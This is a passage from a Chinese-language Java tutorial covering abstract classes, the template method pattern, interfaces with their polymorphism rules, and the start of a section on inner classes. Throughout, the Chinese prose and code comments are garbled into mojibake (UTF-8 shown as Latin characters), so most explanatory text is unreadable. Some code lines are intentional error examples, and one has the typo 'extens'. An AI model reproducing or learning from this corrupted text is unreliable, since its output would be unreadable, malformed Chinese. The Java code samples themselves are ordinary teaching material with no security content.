)ï¼ŒString ä¹Ÿæ˜¯ final ç±»ã€‚\n\n### æŠ½è±¡ç±»\n\n#### æŠ½è±¡ç±»å¼•å‡º\n\nå½“çˆ¶ç±»çš„æŸäº›æ–¹æ³•ï¼Œéœ€è¦å£°æ˜ï¼Œä½†æ˜¯åˆä¸ç¡®å®šå¦‚ä½•å®ç°æ—¶ï¼Œå¯ä»¥å°†å…¶å£°æ˜ä¸º\næŠ½è±¡æ–¹æ³•ï¼Œ é‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æŠ½è±¡ç±»\n\n```java\nclass Animal {\n    private String name;\n  \n    public Animal(String name) {\n    \tthis.name = name;\n    }\n    //eatè¿™é‡Œå®ç°äº†ï¼Œå…¶å®æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰\n    public void eat() {\n    \t\tSystem.out.println(\"è¿™æ˜¯ä¸€ä¸ªåŠ¨ç‰©ï¼Œä½†æ˜¯ä¸çŸ¥é“åƒä»€ä¹ˆ..\");\n    }\n}\n```\n\nè€ƒè™‘å°†è¯¥æ–¹æ³•è®¾è®¡ä¸ºæŠ½è±¡(abstract)æ–¹æ³•ï¼Œæ‰€è°“æŠ½è±¡æ–¹æ³•å°±æ˜¯æ²¡æœ‰å®ç°çš„æ–¹æ³•ï¼Œæ‰€è°“æ²¡æœ‰å®ç°å°±æ˜¯æŒ‡ï¼Œæ²¡æœ‰æ–¹æ³•ä½“ã€‚å½“ä¸€ä¸ªç±»ä¸­å­˜åœ¨æŠ½è±¡æ–¹æ³•æ—¶ï¼Œéœ€è¦å°†è¯¥ç±»å£°æ˜ä¸º abstract ç±»ï¼Œ ä¸€èˆ¬æ¥è¯´ï¼ŒæŠ½è±¡ç±»ä¼šè¢«ç»§æ‰¿ï¼Œç”±å…¶å­ç±»æ¥å®ç°æŠ½è±¡æ–¹æ³•ã€‚\n\n```java\nabstract class Animal {\n    private String name;\n  \n    public Animal(String name) {\n    \tthis.name = name;\n    }\n    //åªå£°æ˜ä¸å®ç°\n\t\tpublic abstract void eat() ;\n}\t\n```\n\n#### æŠ½è±¡ç±»ä»‹ç»\n\nå½“çˆ¶ç±»çš„ä¸€äº›æ–¹æ³•ä¸èƒ½ç¡®å®šæ—¶ï¼Œå¯ä»¥ç”¨ abstract å…³é”®å­—æ¥ä¿®é¥°è¯¥æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•\nå°±æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå¹¶ä¸”éœ€è¦ç”¨ abstract æ¥ä¿®é¥°è¯¥ç±»ï¼Œè¿™ä¸ªç±»å°±å«æŠ½è±¡ç±»ã€‚\n\n- 1ã€ç”¨ abstract å…³é”®å­—æ¥ä¿®é¥°ä¸€ä¸ªç±»æ—¶ï¼Œè¿™ä¸ªç±»å°±å«æŠ½è±¡ç±»\n\n  - ```java\n    è®¿é—®ä¿®é¥°ç¬¦ abstract ç±»å{}\n    ```\n\n- 2ã€ç”¨ abstract å…³é”®å­—æ¥ä¿®é¥°ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•\n\n  - ```java\n    è®¿é—®ä¿®é¥°ç¬¦ abstract è¿”å›ç±»å‹ æ–¹æ³•å(å‚æ•°åˆ—è¡¨);//ä¸èƒ½æœ‰æ–¹æ³•ä½“\n    ```\n\n- 3ã€æŠ½è±¡ç±»çš„ä»·å€¼æ›´å¤šä½œç”¨æ˜¯åœ¨äºè®¾è®¡ï¼Œæ˜¯è®¾è®¡è€…è®¾è®¡å¥½åï¼Œè®©å­ç±»ç»§æ‰¿å¹¶å®ç°æŠ½è±¡ç±»()\n\n#### æŠ½è±¡ç±»æ³¨æ„äº‹é¡¹\n\n- 1ã€æŠ½è±¡ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–\n- 2ã€æŠ½è±¡ç±»ä¸ä¸€å®šè¦åŒ…å« abstract æ–¹æ³•ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠ½è±¡ç±»å¯ä»¥æ²¡æœ‰ abstract æ–¹æ³•\n- 3ã€ä¸€æ—¦ç±»åŒ…å«äº† abstract æ–¹æ³•ï¼Œåˆ™è¿™ä¸ªç±»å¿…é¡»å£°æ˜ä¸º abstract \n- 4ã€abstract åªèƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•ï¼Œä¸èƒ½ä¿®é¥°å±æ€§å’Œå…¶å®ƒçš„\n- 5ã€å¦‚æœä¸€ä¸ªç±»ç»§æ‰¿äº†æŠ½è±¡ç±»ï¼Œåˆ™å®ƒå¿…é¡»å®ç°æŠ½è±¡ç±»çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œ\n  é™¤éå®ƒè‡ªå·±ä¹Ÿå£°æ˜ä¸º abstract ç±»ã€‚\n- 6ã€æŠ½è±¡æ–¹æ³•ä¸èƒ½ä½¿ç”¨ privateï¼Œfinal å’Œ static æ¥ä¿®é¥°ï¼Œå› ä¸ºè¿™äº›å…³é”®å­—éƒ½æ˜¯å’Œé‡å†™ç›¸è¿èƒŒçš„ã€‚\n- 7ã€æŠ½è±¡ç±»å¯ä»¥æœ‰ä»»æ„æˆå‘˜[æŠ½è±¡ç±»æœ¬è´¨è¿˜æ˜¯ç±»]ï¼Œæ¯”å¦‚ï¼šéæŠ½è±¡æ–¹æ³•ã€æ„é€ å™¨ã€é™æ€å±æ€§ç­‰ç­‰\n- 8ã€æŠ½è±¡æ–¹æ³•ä¸èƒ½æœ‰ä¸»ä½“ï¼Œå³ä¸èƒ½å®ç°\n\n```java\npublic class AbstractDetail01 {\npublic static void main(String[] args) {\n    //1ã€æŠ½è±¡ç±»ï¼Œä¸èƒ½è¢«å®ä¾‹åŒ–\n    new A();//é”™è¯¯å†™æ³•\n\t}\n}\n\n//2ã€æŠ½è±¡ç±»ä¸ä¸€å®šè¦åŒ…å«abstractæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´,æŠ½è±¡ç±»å¯ä»¥æ²¡æœ‰abstractæ–¹æ³•\nabstract class A {\n    public void hi() {\n    \t\tSystem.out.println(\"hi\");\n    }\n}\n\n//3ã€ä¸€æ—¦ç±»åŒ…å«äº†abstract æ–¹æ³•,åˆ™è¿™ä¸ªç±»å¿…é¡»å£°æ˜ä¸ºabstract\nabstract class B {\n\t\tpublic abstract void hi();\n}\n\n//4ã€abstract åªèƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•ï¼Œä¸èƒ½ä¿®é¥°å±æ€§å’Œå…¶å®ƒçš„\nclass C {\n\t\tpublic abstract int n1 = 1; //é”™è¯¯å†™æ³•\n}\n\n//5ã€å¦‚æœä¸€ä¸ªç±»ç»§æ‰¿äº†æŠ½è±¡ç±»ï¼Œåˆ™å®ƒå¿…é¡»å®ç°æŠ½è±¡ç±»çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œ\né™¤éå®ƒè‡ªå·±ä¹Ÿå£°æ˜ä¸º abstract ç±»ã€‚\nclass D extens B {\n  @Override\n  public void hi() { \n    //è¿™é‡Œç›¸ç­‰äºDå­ç±»å®ç°äº†çˆ¶ç±»Bçš„æŠ½è±¡æ–¹æ³•ï¼Œæ‰€è°“å®ç°æ–¹æ³•ï¼Œå°±æ˜¯æœ‰æ–¹æ³•ä½“\n  }\n}\n\n//6ã€æŠ½è±¡æ–¹æ³•ä¸èƒ½ä½¿ç”¨ private, final å’Œ static æ¥ä¿®é¥°ï¼Œå› ä¸ºè¿™äº›å…³é”®å­—éƒ½æ˜¯å’Œé‡å†™ç›¸è¿èƒŒçš„ã€‚\nabstract class E {\n\t\tprivate abstract void hi();//é”™è¯¯å†™æ³•\n  \tpublic final abstract void hi();//é”™è¯¯å†™æ³•\n  \tpublic static abstract void hi();//é”™è¯¯å†™æ³•\n  \n}\n\n//7ã€æŠ½è±¡ç±»çš„æœ¬è´¨è¿˜æ˜¯ç±»ï¼Œæ‰€ä»¥å¯ä»¥æœ‰ç±»çš„å„ç§æˆå‘˜\nabstract class F {\n    public int n1 = 10;\n    public static String name = \"æµ‹è¯•\";\n    public void hi() {\n    \t\tSystem.out.println(\"hi\");\n    }\n    public abstract void hello();\n    public static void ok() {\n    \t\tSystem.out.println(\"ok\");\n    }\n}\n//8ã€æŠ½è±¡æ–¹æ³•ä¸èƒ½æœ‰ä¸»ä½“ï¼Œå³ä¸èƒ½å®ç°\nabstract class G {\n    public abstract void hello(){//é”™è¯¯å†™æ³•\n      \n    }\n}\n```\n\n#### æŠ½è±¡ç±»æœ€ä½³å®è·µ-æ¨¡æ¿è®¾è®¡æ¨¡å¼\n\næŠ½è±¡ç±»ä½“ç°çš„å°±æ˜¯ä¸€ç§æ¨¡æ¿æ¨¡å¼çš„è®¾è®¡ï¼ŒæŠ½è±¡ç±»ä½œä¸ºå¤šä¸ªå­ç±»çš„é€šç”¨æ¨¡æ¿ï¼Œå­ç±»åœ¨æŠ½è±¡ç±»çš„åŸºç¡€ä¸Šè¿›è¡Œæ‰©å±•ã€æ”¹é€ ï¼Œä½†å­ç±»æ€»ä½“ä¸Šä¼šä¿ç•™æŠ½è±¡ç±»çš„è¡Œä¸ºæ–¹å¼ã€‚\n\næ¨¡æ¿è®¾è®¡æ¨¡å¼èƒ½è§£å†³çš„é—®é¢˜\n\n- 1ã€å½“åŠŸèƒ½å†…éƒ¨ä¸€éƒ¨åˆ†å®ç°æ˜¯ç¡®å®šï¼Œä¸€éƒ¨åˆ†å®ç°æ˜¯ä¸ç¡®å®šçš„ã€‚è¿™æ—¶å¯ä»¥æŠŠä¸ç¡®å®šçš„éƒ¨åˆ†æš´éœ²å‡ºå»ï¼Œè®©å­ç±»å»å®ç°ã€‚\n- 2ã€ç¼–å†™ä¸€ä¸ªæŠ½è±¡çˆ¶ç±»ï¼Œçˆ¶ç±»æä¾›äº†å¤šä¸ªå­ç±»çš„é€šç”¨æ–¹æ³•ï¼Œå¹¶æŠŠä¸€ä¸ªæˆ–å¤šä¸ªæ–¹æ³•ç•™ç»™å…¶å­ç±»å®ç°ï¼Œå°±æ˜¯ä¸€ç§æ¨¡æ¿æ¨¡å¼ã€‚\n\næ —å­ğŸŒ°ï¼š\n\n- 1.æœ‰å¤šä¸ªç±»ï¼Œå®Œæˆä¸åŒçš„ä»»åŠ¡ job\n- 2.è¦æ±‚ç»Ÿè®¡å¾—åˆ°å„è‡ªå®Œæˆä»»åŠ¡çš„æ—¶é—´\n\nè¯·ç¼–ç¨‹å®ç° TestTemplate.java\n\n```java\nabstract public class Template { //æŠ½è±¡ç±»-æ¨¡æ¿è®¾è®¡æ¨¡å¼\n    public abstract void job();//æŠ½è±¡æ–¹æ³•\n    public void calculateTime() {//å®ç°æ–¹æ³•ï¼Œè°ƒç”¨job æ–¹æ³•\n        //å¾—åˆ°å¼€å§‹çš„æ—¶é—´\n        long start = System.currentTimeMillis();\n        job(); //åŠ¨æ€ç»‘å®šæœºåˆ¶\n        //å¾—çš„ç»“æŸçš„æ—¶é—´\n        long end = System.currentTimeMillis();\n        System.out.println(\"ä»»åŠ¡æ‰§è¡Œæ—¶é—´\" + (end - start));\n    }\n}\n\npublic class AA extends Template {\n    //è®¡ç®—ä»»åŠ¡1\n    @Override\n    public void job() { //å®ç°Template çš„æŠ½è±¡æ–¹æ³•job\n        long num = 0;\n        for (long i = 1; i <= 800000; i++) {\n        \t\tnum += i;\n    \t\t}\n\t\t}\n}\n\npublic class BB extends Template {\n  \t//è®¡ç®—ä»»åŠ¡2\n   \t@Override\n    public void job() {\n    \t\tlong num = 0;\n      \tfor (long i = 1; i <= 80000; i++) {\n          \tnum *= i;\n      \t}\n\t \t}\n}\n\npublic class TestTemplate {\n  public static void main(String[] args) {\n      AA aa = new AA();\n      aa.calculateTime(); //å¤šæ€\n      BB bb = new BB();\n      bb.calculateTime();\n\t}\n}\n```\n\n\n\n### æ¥å£\n\n#### æ¥å£ç®€ä»‹\n\næ¥å£å°±æ˜¯ç»™å‡ºä¸€äº›æ²¡æœ‰å®ç°çš„æ–¹æ³•ï¼Œå°è£…åˆ°ä¸€èµ·ï¼Œåˆ°æŸä¸ªç±»è¦ä½¿ç”¨çš„æ—¶å€™ï¼Œå†æ ¹æ®å…·ä½“æƒ…å†µæŠŠè¿™äº›æ–¹æ³•å†™å‡ºæ¥ã€‚\n\nè¯­æ³•:\n\n```java\n//å®šä¹‰æ¥å£\ninterface æ¥å£å{\n  å±æ€§;//å®é™…ä¸Šæ˜¯ public static final å±æ€§ï¼›\n  æŠ½è±¡æ–¹æ³•; //å®é™…ä¸Šæ˜¯ public abstract æŠ½è±¡æ–¹æ³•; \n  //æ¥å£ä¸­æŠ½è±¡æ–¹æ³•å¯ä»¥ä¸ç”¨ abstract å…³é”®å­—\n}\n\n//å®ç°æ¥å£\nclass ç±»å implements æ¥å£{\n\tè‡ªå·±å±æ€§;\n\tè‡ªå·±æ–¹æ³•;\n  å¿…é¡»å®ç°çš„æ¥å£çš„æŠ½è±¡æ–¹æ³•\n}\n```\n\n- æ¥å£æ˜¯æ›´åŠ æŠ½è±¡çš„æŠ½è±¡ç±»ï¼ŒæŠ½è±¡ç±»é‡Œçš„æ–¹æ³•å¯ä»¥æœ‰æ–¹æ³•ä½“ï¼Œæ¥å£é‡Œçš„æ‰€æœ‰æ–¹æ³•éƒ½æ²¡æœ‰æ–¹æ³•ä½“[jdk7.0]ã€‚\n\n- æ¥å£ä½“ç°äº†ç¨‹åºè®¾è®¡çš„å¤šæ€å’Œé«˜å†…èšä½å¶åˆçš„è®¾è®¡æ€æƒ³ã€‚\n- ç‰¹åˆ«è¯´æ˜: Jdk8.0 åæ¥å£ç±»å¯ä»¥æœ‰é™æ€æ–¹æ³•ï¼Œé»˜è®¤æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´æ¥å£ä¸­å¯ä»¥æœ‰æ–¹æ³•çš„å…·ä½“å®ç°ã€‚\n\n#### æ¥å£æ³¨æ„äº‹é¡¹\n\n- 1ã€æ¥å£ä¸èƒ½è¢«å®ä¾‹åŒ–\n- 2ã€æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•æ˜¯ public æ–¹æ³•ï¼Œæ¥å£ä¸­æŠ½è±¡æ–¹æ³•ï¼Œå¯ä»¥ä¸ç”¨ abstractä¿®é¥°\n- 3ã€ä¸€ä¸ªæ™®é€šç±»å®ç°æ¥å£,å°±å¿…é¡»å°†è¯¥æ¥å£çš„æ‰€æœ‰æ–¹æ³•éƒ½å®ç°ã€‚\n- 4ã€æŠ½è±¡ç±»å®ç°æ¥å£ï¼Œå¯ä»¥ä¸ç”¨å®ç°æ¥å£çš„æ–¹æ³•ã€‚\n\n```java\npublic class InterfaceDetail01 {\n\t\tpublic static void main(String[] args) {\n      //1.æ¥å£ä¸èƒ½è¢«å®ä¾‹åŒ–\n    \tnew IA();//é”™è¯¯å†™æ³•\n\t\t}\n}\n\n//2.æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•æ˜¯public æ–¹æ³•, æ¥å£ä¸­æŠ½è±¡æ–¹æ³•ï¼Œå¯ä»¥ä¸ç”¨abstract ä¿®é¥°\ninterface IA {\n    void say();//ä¿®é¥°ç¬¦é»˜è®¤ public \n    void hi();//å®é™…å°±æ˜¯ public abstract void hi(); \n}\n\n\n//3.ä¸€ä¸ªæ™®é€šç±»å®ç°æ¥å£,å°±å¿…é¡»å°†è¯¥æ¥å£çš„æ‰€æœ‰æ–¹æ³•éƒ½å®ç°,å¯ä»¥ä½¿ç”¨alt+enter æ¥è§£å†³\nclass Cat implements IA{\n    @Override\n    public void say() {\n    }\n    @Override\n    public void hi() {\n    }\n}\n\n//4.æŠ½è±¡ç±»å»å®ç°æ¥å£æ—¶ï¼Œå¯ä»¥ä¸å®ç°æ¥å£çš„æŠ½è±¡æ–¹æ³•\nabstract class Tiger implements IA {\n}\n```\n\n- 5ã€ä¸€ä¸ªç±»åŒæ—¶å¯ä»¥å®ç°å¤š ä¸ªæ¥å£\n- 6ã€æ¥å£ä¸­çš„å±æ€§ï¼Œåªèƒ½æ˜¯ final çš„ï¼Œè€Œä¸”æ˜¯ public static final ä¿®é¥°ç¬¦ã€‚\n  - æ¯”å¦‚ï¼šint a= 1ï¼›å®é™…ä¸Šæ˜¯ public static final int a=1; (å¿…é¡»åˆå§‹åŒ–)\n- 7ã€æ¥å£ä¸­å±æ€§çš„è®¿é—®å½¢å¼ï¼šæ¥å£å.å±æ€§å\n- 8ã€æ¥å£ä¸èƒ½ç»§æ‰¿å…¶å®ƒçš„ç±»ï¼Œä½†æ˜¯å¯ä»¥ç»§æ‰¿å¤šä¸ªåˆ«çš„æ¥å£\n  - interface A extends B,C{}\n- 9ã€æ¥å£çš„ä¿®é¥°ç¬¦åªèƒ½æ˜¯ public å’Œé»˜è®¤ï¼Œè¿™ç‚¹å’Œç±»çš„ä¿®é¥°ç¬¦æ˜¯ä¸€æ ·çš„ã€‚\n\n```java\npublic class InterfaceDetail02 {\n    public static void main(String[] args) {\n        //æ¥å£ä¸­çš„å±æ€§,æ˜¯public static final\n        System.out.println(IB.n1);//è¯´æ˜n1 å°±æ˜¯static\n        //IB.n1 = 30; è¯´æ˜n1 æ˜¯final\n    }\n}\ninterface IB {\n    //æ¥å£ä¸­çš„å±æ€§,åªèƒ½æ˜¯final çš„ï¼Œè€Œä¸”æ˜¯public static final ä¿®é¥°ç¬¦\n    int n1 = 10; //ç­‰ä»·public static final int n1 = 10;\n    void hi();\n}\n\n//æ¥å£çš„ä¿®é¥°ç¬¦åªèƒ½æ˜¯public å’Œé»˜è®¤ï¼Œè¿™ç‚¹å’Œç±»çš„ä¿®é¥°ç¬¦æ˜¯ä¸€æ ·çš„\ninterface IC {\n\t\tvoid say();\n}\n\n//æ¥å£ä¸èƒ½ç»§æ‰¿å…¶å®ƒçš„ç±»,ä½†æ˜¯å¯ä»¥ç»§æ‰¿å¤šä¸ªåˆ«çš„æ¥å£\ninterface ID extends IB,IC {\n}\n\n//ä¸€ä¸ªç±»åŒæ—¶å¯ä»¥å®ç°å¤šä¸ªæ¥å£\nclass Pig implements IB,IC {\n    @Override\n    public void hi() {\n    }\n    @Override\n    public void say() {\n    }\n}\n```\n\n#### æ¥å£&ç»§æ‰¿\n\n- å½“å­ç±»ç»§æ‰¿äº†çˆ¶ç±»ï¼Œå°±è‡ªåŠ¨çš„æ‹¥æœ‰çˆ¶ç±»çš„åŠŸèƒ½\n\n- å¦‚æœå­ç±»éœ€è¦æ‰©å±•åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡å®ç°æ¥å£çš„æ–¹å¼æ‰©å±•\n- å¯ä»¥ç†è§£å®ç°æ¥å£æ˜¯å¯¹Java å•ç»§æ‰¿æœºåˆ¶çš„ä¸€ç§è¡¥å……\n\n```java\npublic class ExtendsVsInterface {\n    public static void main(String[] args) {\n        LittleMonkey wuKong = new LittleMonkey(\"æ‚Ÿç©º\");\n        wuKong.climbing();\n        wuKong.swimming();\n        wuKong.flying();\n    }\n\n}\n//çŒ´å­\nclass Monkey {\n    private String name;\n    public Monkey(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n    public void climbing() {\n        System.out.println(name + \" ä¼šçˆ¬æ ‘...\");\n    }\n}\n//æ¥å£\ninterface Fishable {\n    void swimming();\n}\ninterface Birdable {\n    void flying();\n}\n\nclass LittleMonkey extends Monkey implements Fishable,Birdable {\n    public LittleMonkey(String name) {\n        super(name);\n    }\n    @Override\n    public void swimming() {\n        System.out.println(getName() + \" é€šè¿‡å­¦ä¹ ï¼Œå¯ä»¥åƒé±¼å„¿ä¸€æ ·æ¸¸æ³³...\");\n    }\n    @Override\n    public void flying() {\n        System.out.println(getName() + \" é€šè¿‡å­¦ä¹ ï¼Œå¯ä»¥åƒé¸Ÿå„¿ä¸€æ ·é£ç¿”...\");\n    }\n}\n\n/*\næ‚Ÿç©º ä¼šçˆ¬æ ‘...\næ‚Ÿç©º é€šè¿‡å­¦ä¹ ï¼Œå¯ä»¥åƒé±¼å„¿ä¸€æ ·æ¸¸æ³³...\næ‚Ÿç©º é€šè¿‡å­¦ä¹ ï¼Œå¯ä»¥åƒé¸Ÿå„¿ä¸€æ ·é£ç¿”...\n*/\n```\n\næ¥å£å’Œç»§æ‰¿è§£å†³çš„é—®é¢˜ä¸åŒ\n\n- ç»§æ‰¿çš„ä»·å€¼ä¸»è¦åœ¨äºï¼šè§£å†³ä»£ç çš„å¤ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚\n- æ¥å£çš„ä»·å€¼ä¸»è¦åœ¨äºï¼šè®¾è®¡ï¼Œè®¾è®¡å¥½å„ç§è§„èŒƒ(æ–¹æ³•)ï¼Œè®©å…¶å®ƒç±»å»å®ç°è¿™äº›æ–¹æ³•ï¼Œå³æ›´åŠ çš„çµæ´»ã€‚\n- æ¥å£æ¯”ç»§æ‰¿æ›´åŠ çµæ´»ï¼Œç»§æ‰¿æ˜¯æ»¡è¶³ is-a çš„å…³ç³»ï¼Œè€Œæ¥å£åªéœ€æ»¡è¶³ like-a çš„å…³ç³»ã€‚\n- æ¥å£åœ¨ä¸€å®šç¨‹åº¦ä¸Šå®ç°ä»£ç è§£è€¦(ä»£ç ç›¸äº’ä¾èµ–)[å³:æ¥å£è§„èŒƒæ€§+åŠ¨æ€ç»‘å®šæœºåˆ¶]\n\n#### æ¥å£çš„å¤šæ€ç‰¹æ€§\n\n- 1)å¤šæ€å‚æ•°\n\næ¥å£ç±»å‹çš„å˜é‡å¯ä»¥æŒ‡å‘å®ç°äº†è¯¥æ¥å£ç±»çš„å¯¹è±¡å®ä¾‹\n\nä¾‹å¦‚ USB æ¥å£ï¼Œæ—¢å¯ä»¥æ¥æ”¶æ‰‹æœºå¯¹è±¡ï¼Œåˆå¯ä»¥æ¥æ”¶ç›¸æœºå¯¹è±¡ï¼Œå°±ä½“ç°äº†æ¥å£å¤šæ€(æ¥å£å¼•ç”¨å¯ä»¥æŒ‡å‘å®ç°äº†æ¥å£çš„ç±»çš„å¯¹è±¡)\n\n```java\npublic class InterfacePolyParameter {\n    public static void main(String[] args) {\n        //æ¥å£çš„å¤šæ€ä½“ç°\n        //æ¥å£ç±»å‹çš„å˜é‡usbå¯ä»¥æŒ‡å‘å®ç°äº†USBæ¥å£ç±»çš„å¯¹è±¡å®ä¾‹\n        USB usb = new Phone();\n        usb = new Camera();\n\n        //ç»§æ‰¿ä½“ç°çš„å¤šæ€\n        //çˆ¶ç±»ç±»å‹çš„å˜é‡fatherå¯ä»¥æŒ‡å‘ç»§æ‰¿Farherçš„å­ç±»çš„å¯¹è±¡å®ä¾‹\n        Farher father = new Son();\n        father = new Daughter();\n    }\n}\n\ninterface USB {}\nclass Phone implements USB{}\n\nclass Camera implements USB{}\n\nclass Farher {}\nclass Son extends Farher {}\nclass Daughter extends Farher {}\n```\n\n- 2)å¤šæ€æ•°ç»„\n\næ¼”ç¤ºæ¡ˆä¾‹: ç»™ USB æ•°ç»„ä¸­ï¼Œå­˜æ”¾ Phone å’Œç›¸æœºå¯¹è±¡ï¼Œ Phone ç±»è¿˜æœ‰ä¸€ä¸ªç‰¹æœ‰çš„æ–¹æ³• call() ,è¯·éå† USB æ•°ç»„ï¼Œå¦‚æœæ˜¯ Phone å¯¹è±¡ï¼Œé™¤äº†è°ƒç”¨ USB æ¥å£å®šä¹‰çš„æ–¹æ³•å¤–ï¼Œè¿˜éœ€è¦è°ƒç”¨ Phone ç‰¹æœ‰æ–¹æ³•call\n\n```java\npublic class InterfacePolyArr {\n    public static void main(String[] args) {\n        USB[] usb = new USB[2];\n        usb[0] = new Phone();\n        usb[1] = new Camera();\n        for(int i = 0; i < usb.length; i++) {\n            usb[i].work();//åŠ¨æ€ç»‘å®š..\n            //éœ€è¦è¿›è¡Œç±»å‹çš„å‘ä¸‹è½¬å‹\n            if(usb[i] instanceof Phone) {//åˆ¤æ–­ä»–çš„è¿è¡Œç±»å‹æ˜¯Phone_\n                ((Phone) usb[i]).call();\n            }\n        }\n    }\n}\n\ninterface USB {\n    void work();\n}\nclass Phone implements USB{\n    public void call() {\n        System.out.println(\"æ‰‹æœºå¯ä»¥æ‰“ç”µè¯...\");\n    }\n\n    @Override\n    public void work() {\n        System.out.println(\"æ‰‹æœºå·¥ä½œä¸­...\");\n    }\n}\n\nclass Camera implements USB{\n    @Override\n    public void work() {\n        System.out.println(\"ç›¸æœºå·¥ä½œä¸­...\");\n    }\n}\n```\n\n- 3)å¤šæ€ä¼ é€’\n\nå¦‚æœä¸€ä¸ªç±» Teacher å®ç°äº†æ¥å£ IG ï¼ŒIG æ¥å£ç»§æ‰¿äº† IH æ¥å£ï¼Œé‚£ä¹ˆï¼Œå®é™…ä¸Šå°±ç›¸å½“äºTeacher ç±»ä¹Ÿå®ç°äº† IH æ¥å£ï¼Œè¿™å°±æ˜¯æ¥å£å¤šæ€ä¼ é€’ç°è±¡\n\n```java\npublic class InterfacePolyPass {\n    public static void main(String[] args) {\n        //æ¥å£ç±»å‹çš„å˜é‡å¯ä»¥æŒ‡å‘ï¼Œå®ç°äº†è¯¥æ¥å£çš„ç±»çš„å¯¹è±¡å®ä¾‹\n        IG ig = new Teacher();\n        //å¦‚æœIG ç»§æ‰¿äº†IH æ¥å£ï¼Œè€ŒTeacher ç±»å®ç°äº†IG æ¥å£\n        //é‚£ä¹ˆï¼Œå®é™…ä¸Šå°±ç›¸å½“äºTeacher ç±»ä¹Ÿå®ç°äº†IH æ¥å£.\n        //è¿™å°±æ˜¯æ‰€è°“çš„æ¥å£å¤šæ€ä¼ é€’ç°è±¡.\n        IH ih = new Teacher();\n    }\n}\ninterface IH {\n    void hi();\n}\ninterface IG extends IH{}\n\nclass Teacher implements IG {\n    @Override\n    public void hi() {\n    }\n}\n```\n\nç»ƒä¹ ï¼šåˆ¤æ–­ä»£ç æ˜¯å¦æœ‰è¯¯å¹¶æ”¹è¿›\n\n```java\npublic class InterfaceExercise02 {\n    public static void main(String[] args) {\n        new C().pX();\n    }\n}\n\ninterface A { \n    int x = 0;//ç­‰ä»·public static final int x = 0;\n} \nclass B {\n    int x = 1;//æ™®é€šå±æ€§\n} \nclass C extends B implements A {\n    public void pX() {\n        System.out.println(x); //é”™è¯¯ï¼ŒåŸå› ä¸æ˜ç¡®x\n      \t//æ”¹è¿›\n        //è®¿é—®æ¥å£çš„xå°±ä½¿ç”¨A.x\n        //è®¿é—®çˆ¶ç±»çš„xå°±ä½¿ç”¨super.x\n        System.out.println(A.x + \" \" + super.x);   \n    }\n}\n```\n\n### å†…éƒ¨ç±»\n\n#### ç®€ä»‹\n\nä¸€ä¸ªç±»çš„å†…éƒ¨åˆå®Œæ•´çš„åµŒå¥—äº†å¦ä¸€ä¸ªç±»ç»“æ„ã€‚è¢«åµŒå¥—çš„ç±»ç§°ä¸ºå†…éƒ¨ç±»(inner class)ï¼ŒåµŒå¥—å…¶ä»–ç±»çš„ç±»ç§°ä¸ºå¤–éƒ¨ç±»(outer class)ã€‚ \n\nå†…éƒ¨ç±»æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥ç›´æ¥è®¿é—®ç§æœ‰å±æ€§ï¼Œå¹¶ä¸”å¯ä»¥ä½“ç°ç±»ä¸ç±»ä¹‹é—´çš„åŒ…å«å…³ç³»\n\n```java\n//è¯­æ³•\nclass Outer{ //å¤–éƒ¨ç±»\n    class Inner{ //å†…éƒ¨ç±»\n    }\n}\nclass Other{ //å¤–éƒ¨å…¶ä»–ç±»\n}\n```\n\nç±»çš„äº”å¤§æˆå‘˜ï¼š[å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ã€ä»£ç å—ã€å†…éƒ¨ç±»]\n\n#### åˆ†ç±»\n\nå®šä¹‰åœ¨å±€éƒ¨ä½ç½®(æ–¹æ³•ä¸­/ä»£ç å—) :\n\n- (1) å±€éƒ¨å†…éƒ¨ç±»ï¼ˆæœ‰ç±»åï¼‰\n- (2) åŒ¿åå†…éƒ¨ç±»ï¼ˆæ²¡æœ‰ç±»åï¼‰\n\nå®šä¹‰åœ¨æˆå‘˜ä½ç½®ï¼š\n\n- (1) æˆå‘˜å†…éƒ¨ç±»ï¼ˆæ²¡ç”¨ static ä¿®é¥°ï¼‰\n- (2) é™æ€å†…éƒ¨ç±»ï¼ˆä½¿ç”¨ static ä¿®é¥°ï¼‰\n\n#### å±€éƒ¨å†…éƒ¨ç±»\n\nå±€éƒ¨å†…éƒ¨ç±»æ˜¯å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®(æ–¹æ³•ä¸­æˆ–è€…ä»£ç å—ä¸­)ï¼Œå¹¶ä¸”æœ‰ç±»åã€‚\n\n- 1.ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œå› ä¸ºå®ƒçš„åœ°ä½å°±æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ã€‚å±€éƒ¨å˜é‡æ˜¯ä¸èƒ½ä½¿ç”¨ä¿®é¥°ç¬¦çš„ã€‚ä½†æ˜¯å¯ä»¥ä½¿ç”¨ final ä¿®é¥°ï¼Œå› ä¸ºå±€éƒ¨å˜é‡ä¹Ÿå¯ä»¥ä½¿ç”¨ final\n- 2.ä½œç”¨åŸŸï¼šä»…ä»…åœ¨å®šä¹‰å®ƒçš„æ–¹æ³•æˆ–ä»£ç å—ä¸­ã€‚\n- 3.å±€éƒ¨å†…éƒ¨ç±»è®¿å‘å¤–éƒ¨ç±»çš„æˆå‘˜\n  - 